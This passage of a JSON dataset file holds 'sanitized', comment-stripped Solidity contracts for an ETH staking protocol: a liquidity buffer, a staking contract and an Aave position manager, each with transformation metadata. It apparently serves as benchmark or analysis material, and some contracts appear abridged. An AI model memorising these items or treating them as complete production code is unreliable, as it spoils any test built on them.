positionManagerConfigs;\nmapping(uint256 => PositionAccountant) public positionAccountants;\nuint256 public totalFundsReceived;\nuint256 public totalFundsReturned;\nuint256 public totalAllocatedBalance;\nuint256 public totalInterestClaimed;\nuint256 public totalInterestToppedUp;\nuint256 public totalAllocationCapacity;\nuint256 public cumulativeDrawdown;\nuint256 public defaultManagerId;\naddress payable public feesReceiver;\nuint16 public feesBasisPoints;\nuint256 public totalFeesCollected;\nuint256 public pendingInterest;\nuint256 public pendingPrincipal;\nbool public shouldExecuteAllocation;\nmapping(address => bool) public isRegisteredManager;\nstruct Init {\naddress admin;\naddress liquidityManager;\naddress positionManager;\naddress interestTopUp;\naddress drawdownManager;\naddress payable feesReceiver;\nIStakingReturnsWrite staking;\nIPauserRead pauser;\n}\nerror LiquidityBuffer__ManagerNotFound();\nerror LiquidityBuffer__ManagerInactive();\nerror LiquidityBuffer__ManagerAlreadyRegistered();\nerror LiquidityBuffer__ExceedsAllocationCap();\nerror LiquidityBuffer__InsufficientBalance();\nerror LiquidityBuffer__InsufficientAllocation();\nerror LiquidityBuffer__DoesNotReceiveETH();\nerror LiquidityBuffer__Paused();\nerror LiquidityBuffer__InvalidConfiguration();\nerror LiquidityBuffer__ZeroAddress();\nerror LiquidityBuffer__NotStakingContract();\nerror LiquidityBuffer__NotPositionManagerContract();\nerror LiquidityBuffer__ExceedsPendingInterest();\nerror LiquidityBuffer__ExceedsPendingPrincipal();\nconstructor() {\n_disableInitializers();\n}\nfunction initialize(Init memory init) external initializer {\n__AccessControlEnumerable_init();\n_grantRole(DEFAULT_ADMIN_ROLE, init.admin);\n_grantRole(LIQUIDITY_MANAGER_ROLE, init.liquidityManager);\n_grantRole(POSITION_MANAGER_ROLE, init.positionManager);\n_grantRole(INTEREST_TOPUP_ROLE, init.interestTopUp);\n_grantRole(DRAWDOWN_MANAGER_ROLE, init.drawdownManager);\nstakingContract = init.staking;\npauser = init.pauser;\nfeesReceiver = init.feesReceiver;\nshouldExecuteAllocation = true;\n_grantRole(LIQUIDITY_MANAGER_ROLE, address(stakingContract));\n}\nfunction getInterestAmount(uint256 managerId) public view returns (uint256) {\nPositionManagerConfig memory config = positionManagerConfigs[managerId];\nIPositionManager manager = IPositionManager(config.managerAddress);\nuint256 currentBalance = manager.getUnderlyingBalance();\nPositionAccountant memory accounting = positionAccountants[managerId];\nif (currentBalance > accounting.allocatedBalance) {\nreturn currentBalance - accounting.allocatedBalance;\n}\nreturn 0;\n}\nfunction getAvailableCapacity() public view returns (uint256) {\nreturn totalAllocationCapacity - totalAllocatedBalance;\n}\nfunction getAvailableBalance() public view returns (uint256) {\nreturn totalFundsReceived - totalFundsReturned;\n}\nfunction getControlledBalance() public view returns (uint256) {\nuint256 totalBalance = address(this).balance;\nfor (uint256 i = 0; i < positionManagerCount; i++) {\nPositionManagerConfig storage config = positionManagerConfigs[i];\nif (config.isActive) {\nIPositionManager manager = IPositionManager(config.managerAddress);\nuint256 managerBalance = manager.getUnderlyingBalance();\ntotalBalance += managerBalance;\n}\n}\nreturn totalBalance;\n}\nfunction addPositionManager(\naddress managerAddress,\nuint256 allocationCap\n) external onlyRole(POSITION_MANAGER_ROLE) returns (uint256 managerId) {\nif (isRegisteredManager[managerAddress]) revert LiquidityBuffer__ManagerAlreadyRegistered();\nmanagerId = positionManagerCount;\npositionManagerCount++;\npositionManagerConfigs[managerId] = PositionManagerConfig({\nmanagerAddress: managerAddress,\nallocationCap: allocationCap,\nisActive: true\n});\npositionAccountants[managerId] = PositionAccountant({\nallocatedBalance: 0,\ninterestClaimedFromManager: 0\n});\nisRegisteredManager[managerAddress] = true;\ntotalAllocationCapacity += allocationCap;\nemit ProtocolConfigChanged(\nthis.addPositionManager.selector,\n\"addPositionManager(address,uint256)\",\nabi.encode(managerAddress, allocationCap)\n);\n}\nfunction updatePositionManager(\nuint256 managerId,\nuint256 newAllocationCap,\nbool isActive\n) external onlyRole(POSITION_MANAGER_ROLE) {\nif (managerId >= positionManagerCount) {\nrevert LiquidityBuffer__ManagerNotFound();\n}\nPositionManagerConfig storage config = positionManagerConfigs[managerId];\nif (newAllocationCap < positionAccountants[managerId].allocatedBalance) {\nrevert LiquidityBuffer__InvalidConfiguration();\n}\ntotalAllocationCapacity = totalAllocationCapacity - config.allocationCap + newAllocationCap;\nconfig.allocationCap = newAllocationCap;\nconfig.isActive = isActive;\nemit ProtocolConfigChanged(\nthis.updatePositionManager.selector,\n\"updatePositionManager(uint256,uint256,bool)\",\nabi.encode(managerId, newAllocationCap, isActive)\n);\n}\nfunction togglePositionManagerStatus(uint256 managerId) external onlyRole(POSITION_MANAGER_ROLE) {\nif (managerId >= positionManagerCount) {\nrevert LiquidityBuffer__ManagerNotFound();\n}\nPositionManagerConfig storage config = positionManagerConfigs[managerId];\nconfig.isActive = !config.isActive;\nemit ProtocolConfigChanged(\nthis.togglePositionManagerStatus.selector,\n\"togglePositionManagerStatus(uint256)\",\nabi.encode(managerId)\n);\n}\nfunction setCumulativeDrawdown(uint256 drawdownAmount) external onlyRole(DRAWDOWN_MANAGER_ROLE) {\ncumulativeDrawdown = drawdownAmount;\nemit ProtocolConfigChanged(\nthis.setCumulativeDrawdown.selector,\n\"setCumulativeDrawdown(uint256)\",\nabi.encode(drawdownAmount)\n);\n}\nfunction setDefaultManagerId(uint256 newDefaultManagerId) external onlyRole(POSITION_MANAGER_ROLE) {\nif (newDefaultManagerId >= positionManagerCount) {\nrevert LiquidityBuffer__ManagerNotFound();\n}\nif (!positionManagerConfigs[newDefaultManagerId].isActive) {\nrevert LiquidityBuffer__ManagerInactive();\n}\ndefaultManagerId = newDefaultManagerId;\nemit ProtocolConfigChanged(\nthis.setDefaultManagerId.selector,\n\"setDefaultManagerId(uint256)\",\nabi.encode(newDefaultManagerId)\n);\n}\nfunction setFeeBasisPoints(uint16 newBasisPoints) external onlyRole(POSITION_MANAGER_ROLE) {\nif (newBasisPoints > _BASIS_POINTS_DENOMINATOR) {\nrevert LiquidityBuffer__InvalidConfiguration();\n}\nfeesBasisPoints = newBasisPoints;\nemit ProtocolConfigChanged(\nthis.setFeeBasisPoints.selector, \"setFeeBasisPoints(uint16)\", abi.encode(newBasisPoints)\n);\n}\nfunction setFeesReceiver(address payable newReceiver)\nexternal\nonlyRole(POSITION_MANAGER_ROLE)\nnotZeroAddress(newReceiver) {\nfeesReceiver = newReceiver;\nemit ProtocolConfigChanged(this.setFeesReceiver.selector, \"setFeesReceiver(address)\", abi.encode(newReceiver));\n}\nfunction setShouldExecuteAllocation(bool executeAllocation) external onlyRole(POSITION_MANAGER_ROLE) {\nshouldExecuteAllocation = executeAllocation;\nemit ProtocolConfigChanged(this.setShouldExecuteAllocation.selector, \"setShouldExecuteAllocation(bool)\", abi.encode(executeAllocation));\n}\nfunction depositETH() external payable onlyRole(LIQUIDITY_MANAGER_ROLE) {\nif (pauser.isLiquidityBufferPaused()) revert LiquidityBuffer__Paused();\n_receiveETHFromStaking(msg.value);\nif (shouldExecuteAllocation) {\n_allocateETHToManager(defaultManagerId, msg.value);\n}\n}\nfunction withdrawAndReturn(uint256 managerId, uint256 amount) external onlyRole(LIQUIDITY_MANAGER_ROLE) {\n_withdrawETHFromManager(managerId, amount);\n_returnETHToStaking(amount);\n}\nfunction allocateETHToManager(uint256 managerId, uint256 amount) external onlyRole(LIQUIDITY_MANAGER_ROLE) {\n_allocateETHToManager(managerId, amount);\n}\nfunction withdrawETHFromManager(uint256 managerId, uint256 amount) external onlyRole(LIQUIDITY_MANAGER_ROLE) {\n_withdrawETHFromManager(managerId, amount);\n}\nfunction returnETHToStaking(uint256 amount) external onlyRole(LIQUIDITY_MANAGER_ROLE) {\n_returnETHToStaking(amount);\n}\nfunction receiveETHFromPositionManager() external payable onlyPositionManagerContract {\n}\nfunction claimInterestFromManager(uint256 managerId, uint256 minAmount) external onlyRole(INTEREST_TOPUP_ROLE) returns (uint256) {\nuint256 amount = _claimInterestFromManager(managerId);\nif (amount < minAmount) {\nrevert LiquidityBuffer__InsufficientBalance();\n}\nreturn amount;\n}\nfunction topUpInterestToStaking(uint256 amount) external onlyRole(INTEREST_TOPUP_ROLE) returns (uint256) {\nif (address(this).balance < amount) {\nrevert LiquidityBuffer__InsufficientBalance();\n}\n_topUpInterestToStakingAndCollectFees(amount);\nreturn amount;\n}\nfunction claimInterestAndTopUp(uint256 managerId, uint256 minAmount) external onlyRole(INTEREST_TOPUP_ROLE) returns (uint256) {\nuint256 amount = _claimInterestFromManager(managerId);\nif (amount < minAmount) {\nrevert LiquidityBuffer__InsufficientBalance();\n}\n_topUpInterestToStakingAndCollectFees(amount);\nreturn amount;\n}\nfunction _topUpInterestToStakingAndCollectFees(uint256 amount) internal {\nif (pauser.isLiquidityBufferPaused()) {\nrevert LiquidityBuffer__Paused();\n}\nif (amount > pendingInterest) {\nrevert LiquidityBuffer__ExceedsPendingInterest();\n}\npendingInterest -= amount;\nuint256 fees = Math.mulDiv(feesBasisPoints, amount, _BASIS_POINTS_DENOMINATOR);\nuint256 topUpAmount = amount - fees;\nstakingContract.topUp{value: topUpAmount}();\ntotalInterestToppedUp += topUpAmount;\nemit InterestToppedUp(topUpAmount);\nif (fees > 0) {\nAddress.sendValue(feesReceiver, fees);\ntotalFeesCollected += fees;\nemit FeesCollected(fees);\n}\n}\nfunction _claimInterestFromManager(uint256 managerId) internal returns (uint256) {\nif (pauser.isLiquidityBufferPaused()) {\nrevert LiquidityBuffer__Paused();\n}\nuint256 interestAmount = getInterestAmount(managerId);\nif (interestAmount > 0) {\nPositionManagerConfig memory config = positionManagerConfigs[managerId];\npositionAccountants[managerId].interestClaimedFromManager += interestAmount;\ntotalInterestClaimed += interestAmount;\npendingInterest += interestAmount;\nemit InterestClaimed(managerId, interestAmount);\nIPositionManager manager = IPositionManager(config.managerAddress);\nmanager.withdraw(interestAmount);\n} else {\nemit InterestClaimed(managerId, interestAmount);\n}\nreturn interestAmount;\n}\nfunction _withdrawETHFromManager(uint256 managerId, uint256 amount) internal {\nif (pauser.isLiquidityBufferPaused()) {\nrevert LiquidityBuffer__Paused();\n}\nif (managerId >= positionManagerCount) revert LiquidityBuffer__ManagerNotFound();\nPositionManagerConfig memory config = positionManagerConfigs[managerId];\nif (!config.isActive) revert LiquidityBuffer__ManagerInactive();\nPositionAccountant storage accounting = positionAccountants[managerId];\nif (amount > accounting.allocatedBalance) {\nrevert LiquidityBuffer__InsufficientAllocation();\n}\naccounting.allocatedBalance -= amount;\ntotalAllocatedBalance -= amount;\npendingPrincipal += amount;\nemit ETHWithdrawnFromManager(managerId, amount);\nIPositionManager manager = IPositionManager(config.managerAddress);\nmanager.withdraw(amount);\n}\nfunction _returnETHToStaking(uint256 amount) internal {\nif (pauser.isLiquidityBufferPaused()) {\nrevert LiquidityBuffer__Paused();\n}\nif (address(stakingContract) == address(0)) {\nrevert LiquidityBuffer__ZeroAddress();\n}\nif (amount > pendingPrincipal) {\nrevert LiquidityBuffer__ExceedsPendingPrincipal();\n}\ntotalFundsReturned += amount;\npendingPrincipal -= amount;\nemit ETHReturnedToStaking(amount);\nstakingContract.receiveReturnsFromLiquidityBuffer{value: amount}();\n}\nfunction _allocateETHToManager(uint256 managerId, uint256 amount) internal {\nif (pauser.isLiquidityBufferPaused()) {\nrevert LiquidityBuffer__Paused();\n}\nif (amount > pendingPrincipal) {\nrevert LiquidityBuffer__ExceedsPendingPrincipal();\n}\nif (managerId >= positionManagerCount) revert LiquidityBuffer__ManagerNotFound();\nif (address(this).balance < amount) revert LiquidityBuffer__InsufficientBalance();\nPositionManagerConfig memory config = positionManagerConfigs[managerId];\nif (!config.isActive) revert LiquidityBuffer__ManagerInactive();\nPositionAccountant storage accounting = positionAccountants[managerId];\nif (accounting.allocatedBalance + amount > config.allocationCap) {\nrevert LiquidityBuffer__ExceedsAllocationCap();\n}\naccounting.allocatedBalance += amount;\ntotalAllocatedBalance += amount;\npendingPrincipal -= amount;\nemit ETHAllocatedToManager(managerId, amount);\nIPositionManager manager = IPositionManager(config.managerAddress);\nmanager.deposit{value: amount}(0);\n}\nfunction _receiveETHFromStaking(uint256 amount) internal {\ntotalFundsReceived += amount;\npendingPrincipal += amount;\nemit ETHReceivedFromStaking(amount);\n}\nmodifier notZeroAddress(address addr) {\nif (addr == address(0)) {\nrevert LiquidityBuffer__ZeroAddress();\n}\n_;\n}\nmodifier onlyStakingContract() {\nif (msg.sender != address(stakingContract)) {\nrevert LiquidityBuffer__NotStakingContract();\n}\n_;\n}\nmodifier onlyPositionManagerContract() {\nbool isValidManager = false;\nfor (uint256 i = 0; i < positionManagerCount; i++) {\nPositionManagerConfig memory config = positionManagerConfigs[i];\nif (msg.sender == config.managerAddress && config.isActive) {\nisValidManager = true;\nbreak;\n}\n}\nif (!isValidManager) {\nrevert LiquidityBuffer__NotPositionManagerContract();\n}\n_;\n}\nreceive() external payable {\nrevert LiquidityBuffer__DoesNotReceiveETH();\n}\nfallback() external payable {\nrevert LiquidityBuffer__DoesNotReceiveETH();\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 110,
        "mode": "compressed",
        "original_lines": 571,
        "transformed_lines": 392,
        "original_chars": 22442,
        "transformed_chars": 14931,
        "compression_ratio": 0.67
      },
      "error": null
    },
    {
      "original_id": "sn_gs_025",
      "transformed_id": "ss_l1_compressed_sn_gs_025",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.20;\nimport {Initializable} from \"openzeppelin-upgradeable/proxy/utils/Initializable.sol\";\nimport {AccessControlEnumerableUpgradeable} from\n\"openzeppelin-upgradeable/access/AccessControlEnumerableUpgradeable.sol\";\nimport {Math} from \"openzeppelin/utils/math/Math.sol\";\nimport {IERC20} from \"openzeppelin/token/ERC20/IERC20.sol\";\nimport {SafeERC20Upgradeable} from \"openzeppelin-upgradeable/token/ERC20/utils/SafeERC20Upgradeable.sol\";\nimport {ProtocolEvents} from \"./interfaces/ProtocolEvents.sol\";\nimport {IDepositContract} from \"./interfaces/IDepositContract.sol\";\nimport {IMETH} from \"./interfaces/IMETH.sol\";\nimport {IOracleReadRecord, OracleRecord} from \"./interfaces/IOracle.sol\";\nimport {IPauserRead} from \"./interfaces/IPauser.sol\";\nimport {IStaking, IStakingReturnsWrite, IStakingInitiationRead} from \"./interfaces/IStaking.sol\";\nimport {UnstakeRequest, IUnstakeRequestsManager} from \"./interfaces/IUnstakeRequestsManager.sol\";\nimport {ILiquidityBuffer} from \"./liquidityBuffer/interfaces/ILiquidityBuffer.sol\";\ninterface StakingEvents {\nevent Staked(address indexed staker, uint256 ethAmount, uint256 mETHAmount);\nevent UnstakeRequested(uint256 indexed id, address indexed staker, uint256 ethAmount, uint256 mETHLocked);\nevent UnstakeRequestClaimed(uint256 indexed id, address indexed staker);\nevent ValidatorInitiated(bytes32 indexed id, uint256 indexed operatorID, bytes pubkey, uint256 amountDeposited);\nevent AllocatedETHToUnstakeRequestsManager(uint256 amount);\nevent AllocatedETHToDeposits(uint256 amount);\nevent ReturnsReceived(uint256 amount);\nevent ReturnsReceivedFromLiquidityBuffer(uint256 amount);\nevent AllocatedETHToLiquidityBuffer(uint256 amount);\n}\ncontract Staking is Initializable, AccessControlEnumerableUpgradeable, IStaking, StakingEvents, ProtocolEvents {\nerror DoesNotReceiveETH();\nerror InvalidConfiguration();\nerror MaximumValidatorDepositExceeded();\nerror MaximumMETHSupplyExceeded();\nerror MinimumStakeBoundNotSatisfied();\nerror MinimumUnstakeBoundNotSatisfied();\nerror MinimumValidatorDepositNotSatisfied();\nerror NotEnoughDepositETH();\nerror NotEnoughUnallocatedETH();\nerror NotReturnsAggregator();\nerror NotLiquidityBuffer();\nerror NotUnstakeRequestsManager();\nerror Paused();\nerror PreviouslyUsedValidator();\nerror ZeroAddress();\nerror InvalidDepositRoot(bytes32);\nerror StakeBelowMinimumMETHAmount(uint256 methAmount, uint256 expectedMinimum);\nerror UnstakeBelowMinimumETHAmount(uint256 ethAmount, uint256 expectedMinimum);\nerror InvalidWithdrawalCredentialsWrongLength(uint256);\nerror InvalidWithdrawalCredentialsNotETH1(bytes12);\nerror InvalidWithdrawalCredentialsWrongAddress(address);\nbytes32 public constant STAKING_MANAGER_ROLE = keccak256(\"STAKING_MANAGER_ROLE\");\nbytes32 public constant ALLOCATOR_SERVICE_ROLE = keccak256(\"ALLOCATER_SERVICE_ROLE\");\nbytes32 public constant INITIATOR_SERVICE_ROLE = keccak256(\"INITIATOR_SERVICE_ROLE\");\nbytes32 public constant STAKING_ALLOWLIST_MANAGER_ROLE = keccak256(\"STAKING_ALLOWLIST_MANAGER_ROLE\");\nbytes32 public constant STAKING_ALLOWLIST_ROLE = keccak256(\"STAKING_ALLOWLIST_ROLE\");\nbytes32 public constant TOP_UP_ROLE = keccak256(\"TOP_UP_ROLE\");\nstruct ValidatorParams {\nuint256 operatorID;\nuint256 depositAmount;\nbytes pubkey;\nbytes withdrawalCredentials;\nbytes signature;\nbytes32 depositDataRoot;\n}\nmapping(bytes pubkey => bool exists) public usedValidators;\nuint256 public totalDepositedInValidators;\nuint256 public numInitiatedValidators;\nuint256 public unallocatedETH;\nuint256 public allocatedETHForDeposits;\nuint256 public minimumStakeBound;\nuint256 public minimumUnstakeBound;\nuint16 public exchangeAdjustmentRate;\nuint16 internal constant _BASIS_POINTS_DENOMINATOR = 10_000;\nuint16 internal constant _MAX_EXCHANGE_ADJUSTMENT_RATE = _BASIS_POINTS_DENOMINATOR / 10;\nuint256 public minimumDepositAmount;\nuint256 public maximumDepositAmount;\nIDepositContract public depositContract;\nIMETH public mETH;\nIOracleReadRecord public oracle;\nIPauserRead public pauser;\nIUnstakeRequestsManager public unstakeRequestsManager;\naddress public withdrawalWallet;\naddress public returnsAggregator;\nbool public isStakingAllowlist;\nuint256 public initializationBlockNumber;\nuint256 public maximumMETHSupply;\nILiquidityBuffer public liquidityBuffer;\nstruct Init {\naddress admin;\naddress manager;\naddress allocatorService;\naddress initiatorService;\naddress returnsAggregator;\naddress withdrawalWallet;\nIMETH mETH;\nIDepositContract depositContract;\nIOracleReadRecord oracle;\nIPauserRead pauser;\nIUnstakeRequestsManager unstakeRequestsManager;\n}\nconstructor() {\n_disableInitializers();\n}\nfunction initialize(Init memory init) external initializer {\n__AccessControlEnumerable_init();\n_grantRole(DEFAULT_ADMIN_ROLE, init.admin);\n_grantRole(STAKING_MANAGER_ROLE, init.manager);\n_grantRole(ALLOCATOR_SERVICE_ROLE, init.allocatorService);\n_grantRole(INITIATOR_SERVICE_ROLE, init.initiatorService);\n_setRoleAdmin(STAKING_ALLOWLIST_MANAGER_ROLE, STAKING_MANAGER_ROLE);\n_setRoleAdmin(STAKING_ALLOWLIST_ROLE, STAKING_ALLOWLIST_MANAGER_ROLE);\nmETH = init.mETH;\ndepositContract = init.depositContract;\noracle = init.oracle;\npauser = init.pauser;\nreturnsAggregator = init.returnsAggregator;\nunstakeRequestsManager = init.unstakeRequestsManager;\nwithdrawalWallet = init.withdrawalWallet;\nminimumStakeBound = 0.1 ether;\nminimumUnstakeBound = 0.01 ether;\nminimumDepositAmount = 32 ether;\nmaximumDepositAmount = 32 ether;\nisStakingAllowlist = true;\ninitializationBlockNumber = block.number;\nmaximumMETHSupply = 1024 ether;\n}\nfunction initializeV2(ILiquidityBuffer lb) public reinitializer(2) {\nliquidityBuffer = lb;\n}\nfunction stake(uint256 minMETHAmount) external payable {\nif (pauser.isStakingPaused()) {\nrevert Paused();\n}\nif (isStakingAllowlist) {\n_checkRole(STAKING_ALLOWLIST_ROLE);\n}\nif (msg.value < minimumStakeBound) {\nrevert MinimumStakeBoundNotSatisfied();\n}\nuint256 mETHMintAmount = ethToMETH(msg.value);\nif (mETHMintAmount + mETH.totalSupply() > maximumMETHSupply) {\nrevert MaximumMETHSupplyExceeded();\n}\nif (mETHMintAmount < minMETHAmount) {\nrevert StakeBelowMinimumMETHAmount(mETHMintAmount, minMETHAmount);\n}\nunallocatedETH += msg.value;\nemit Staked(msg.sender, msg.value, mETHMintAmount);\nmETH.mint(msg.sender, mETHMintAmount);\n}\nfunction unstakeRequest(uint128 methAmount, uint128 minETHAmount) external returns (uint256) {\nreturn _unstakeRequest(methAmount, minETHAmount);\n}\nfunction unstakeRequestWithPermit(\nuint128 methAmount,\nuint128 minETHAmount,\nuint256 deadline,\nuint8 v,\nbytes32 r,\nbytes32 s\n) external returns (uint256) {\nSafeERC20Upgradeable.safePermit(mETH, msg.sender, address(this), methAmount, deadline, v, r, s);\nreturn _unstakeRequest(methAmount, minETHAmount);\n}\nfunction _unstakeRequest(uint128 methAmount, uint128 minETHAmount) internal returns (uint256) {\nif (pauser.isUnstakeRequestsAndClaimsPaused()) {\nrevert Paused();\n}\nif (methAmount < minimumUnstakeBound) {\nrevert MinimumUnstakeBoundNotSatisfied();\n}\nuint128 ethAmount = uint128(mETHToETH(methAmount));\nif (ethAmount < minETHAmount) {\nrevert UnstakeBelowMinimumETHAmount(ethAmount, minETHAmount);\n}\nuint256 requestID =\nunstakeRequestsManager.create({requester: msg.sender, mETHLocked: methAmount, ethRequested: ethAmount});\nemit UnstakeRequested({id: requestID, staker: msg.sender, ethAmount: ethAmount, mETHLocked: methAmount});\nSafeERC20Upgradeable.safeTransferFrom(mETH, msg.sender, address(unstakeRequestsManager), methAmount);\nreturn requestID;\n}\nfunction ethToMETH(uint256 ethAmount) public view returns (uint256) {\nif (mETH.totalSupply() == 0) {\nreturn ethAmount;\n}\nuint256 adjustedTotalControlled = Math.mulDiv(\ntotalControlled(), _BASIS_POINTS_DENOMINATOR + exchangeAdjustmentRate, _BASIS_POINTS_DENOMINATOR\n);\nreturn Math.mulDiv(ethAmount, mETH.totalSupply(), adjustedTotalControlled);\n}\nfunction mETHToETH(uint256 mETHAmount) public view returns (uint256) {\nif (mETH.totalSupply() == 0) {\nreturn mETHAmount;\n}\nreturn Math.mulDiv(mETHAmount, totalControlled(), mETH.totalSupply());\n}\nfunction totalControlled() public view returns (uint256) {\nOracleRecord memory record = oracle.latestRecord();\nuint256 total = 0;\ntotal += unallocatedETH;\ntotal += allocatedETHForDeposits;\ntotal += totalDepositedInValidators - record.cumulativeProcessedDepositAmount;\ntotal += record.currentTotalValidatorBalance;\ntotal += liquidityBuffer.getAvailableBalance();\ntotal -= liquidityBuffer.cumulativeDrawdown();\ntotal += unstakeRequestsManager.balance();\nreturn total;\n}\nfunction receiveReturns() external payable onlyReturnsAggregator {\nemit ReturnsReceived(msg.value);\nunallocatedETH += msg.value;\n}\nfunction receiveReturnsFromLiquidityBuffer() external payable onlyLiquidityBuffer {\nemit ReturnsReceivedFromLiquidityBuffer(msg.value);\nunallocatedETH += msg.value;\n}\nmodifier onlyReturnsAggregator() {\nif (msg.sender != returnsAggregator) {\nrevert NotReturnsAggregator();\n}\n_;\n}\nmodifier onlyLiquidityBuffer() {\nif (msg.sender != address(liquidityBuffer)) {\nrevert NotLiquidityBuffer();\n}\n_;\n}\nmodifier onlyUnstakeRequestsManager() {\nif (msg.sender != address(unstakeRequestsManager)) {\nrevert NotUnstakeRequestsManager();\n}\n_;\n}\nmodifier notZeroAddress(address addr) {\nif (addr == address(0)) {\nrevert ZeroAddress();\n}\n_;\n}\nreceive() external payable {\nrevert DoesNotReceiveETH();\n}\nfallback() external payable {\nrevert DoesNotReceiveETH();\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 53,
        "mode": "compressed",
        "original_lines": 309,
        "transformed_lines": 245,
        "original_chars": 11744,
        "transformed_chars": 9312,
        "compression_ratio": 0.79
      },
      "error": null
    },
    {
      "original_id": "sn_gs_026",
      "transformed_id": "ss_l1_compressed_sn_gs_026",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.20;\nimport {Initializable} from \"openzeppelin-upgradeable/proxy/utils/Initializable.sol\";\nimport {AccessControlEnumerableUpgradeable} from\n\"openzeppelin-upgradeable/access/AccessControlEnumerableUpgradeable.sol\";\nimport {SafeERC20} from \"openzeppelin/token/ERC20/utils/SafeERC20.sol\";\nimport {IERC20} from \"openzeppelin/token/ERC20/IERC20.sol\";\nimport {IPool} from \"aave-v3/interfaces/IPool.sol\";\nimport {DataTypes} from \"aave-v3/protocol/libraries/types/DataTypes.sol\";\nimport {IPositionManager} from './interfaces/IPositionManager.sol';\nimport {IWETH} from \"./interfaces/IWETH.sol\";\nimport {ILiquidityBuffer} from \"../liquidityBuffer/interfaces/ILiquidityBuffer.sol\";\ncontract PositionManager is Initializable, AccessControlEnumerableUpgradeable, IPositionManager {\nusing SafeERC20 for IERC20;\nbytes32 public constant EXECUTOR_ROLE = keccak256(\"EXECUTOR_ROLE\");\nbytes32 public constant MANAGER_ROLE = keccak256(\"MANAGER_ROLE\");\nbytes32 public constant EMERGENCY_ROLE = keccak256(\"EMERGENCY_ROLE\");\nIPool public pool;\nIWETH public weth;\nILiquidityBuffer public liquidityBuffer;\nstruct Init {\naddress admin;\naddress manager;\nILiquidityBuffer liquidityBuffer;\nIWETH weth;\nIPool pool;\n}\nevent Deposit(address indexed caller, uint amount, uint aTokenAmount);\nevent Withdraw(address indexed caller, uint amount);\nevent Borrow(address indexed caller, uint amount, uint rateMode);\nevent Repay(address indexed caller, uint amount, uint rateMode);\nevent SetUserEMode(address indexed caller, uint8 categoryId);\nconstructor() {\n_disableInitializers();\n}\nfunction initialize(Init memory init) external initializer {\n__AccessControlEnumerable_init();\nweth = init.weth;\npool = init.pool;\nliquidityBuffer = init.liquidityBuffer;\n_grantRole(DEFAULT_ADMIN_ROLE, init.admin);\n_grantRole(MANAGER_ROLE, init.manager);\n_grantRole(EXECUTOR_ROLE, address(init.liquidityBuffer));\nweth.approve(address(pool), type(uint256).max);\n}\nfunction deposit(uint16 referralCode) external payable override onlyRole(EXECUTOR_ROLE) {\nif (msg.value > 0) {\nweth.deposit{value: msg.value}();\npool.deposit(address(weth), msg.value, address(this), referralCode);\nemit Deposit(msg.sender, msg.value, msg.value);\n}\n}\nfunction withdraw(uint256 amount) external override onlyRole(EXECUTOR_ROLE) {\nrequire(amount > 0, 'Invalid amount');\nIERC20 aWETH = IERC20(pool.getReserveAToken(address(weth)));\nuint256 userBalance = aWETH.balanceOf(address(this));\nuint256 amountToWithdraw = amount;\nif (amount == type(uint256).max) {\namountToWithdraw = userBalance;\n}\nrequire(amountToWithdraw <= userBalance, 'Insufficient balance');\npool.withdraw(address(weth), amountToWithdraw, address(this));\nweth.withdraw(amountToWithdraw);\nliquidityBuffer.receiveETHFromPositionManager{value: amountToWithdraw}();\nemit Withdraw(msg.sender, amountToWithdraw);\n}\nfunction getUnderlyingBalance() external view returns (uint256) {\nIERC20 aWETH = IERC20(pool.getReserveAToken(address(weth)));\nreturn aWETH.balanceOf(address(this));\n}\nfunction setUserEMode(uint8 categoryId) external override onlyRole(MANAGER_ROLE) {\npool.setUserEMode(categoryId);\nemit SetUserEMode(msg.sender, categoryId);\n}\nfunction approveToken(address token, address addr, uint256 wad) external override onlyRole(MANAGER_ROLE) {\nIERC20(token).safeApprove(addr, wad);\n}\nfunction revokeToken(address token, address addr) external override onlyRole(MANAGER_ROLE) {\nIERC20(token).safeApprove(addr, 0);\n}\nfunction getBorrowBalance() external view returns (uint256) {\naddress debtToken = pool.getReserveVariableDebtToken(address(weth));\nreturn IERC20(debtToken).balanceOf(address(this));\n}\nfunction getCollateralBalance() external view returns (uint256) {\nIERC20 aWETH = IERC20(pool.getReserveAToken(address(weth)));\nreturn aWETH.balanceOf(address(this));\n}\nfunction getUserEMode() external view returns (uint256) {\nreturn pool.getUserEMode(address(this));\n}\nfunction setUserUseReserveAsCollateral(address asset, bool useAsCollateral) external onlyRole(MANAGER_ROLE) {\npool.setUserUseReserveAsCollateral(asset, useAsCollateral);\n}\nfunction setLiquidityBuffer(address _liquidityBuffer) external onlyRole(MANAGER_ROLE) {\n_revokeRole(EXECUTOR_ROLE, address(liquidityBuffer));\n_grantRole(EXECUTOR_ROLE, _liquidityBuffer);\nliquidityBuffer = ILiquidityBuffer(_liquidityBuffer);\n}\nfunction emergencyTokenTransfer(address token, address to, uint256 amount) external onlyRole(EMERGENCY_ROLE) {\nIERC20(token).safeTransfer(to, amount);\n}\nfunction emergencyEtherTransfer(address to, uint256 amount) external onlyRole(EMERGENCY_ROLE) {\n_safeTransferETH(to, amount);\n}\nfunction _safeTransferETH(address to, uint256 value) internal {\n(bool success, ) = to.call{value: value}(new bytes(0));\nrequire(success, 'ETH_TRANSFER_FAILED');\n}\nreceive() external payable {\nrequire(msg.sender == address(weth), 'Receive not allowed');\n}\nfallback() external payable {\nrevert('Fallback not allowed');\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 39,
        "mode": "compressed",
        "original_lines": 198,
        "transformed_lines": 115,
        "original_chars": 7209,
        "transformed_chars": 4887,
        "compression_ratio": 0.68
      },
      "error": null
    },
    {
      "original_id": "sn_gs_027",
      "transformed_id": "ss_l1_compressed_sn_gs_027",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
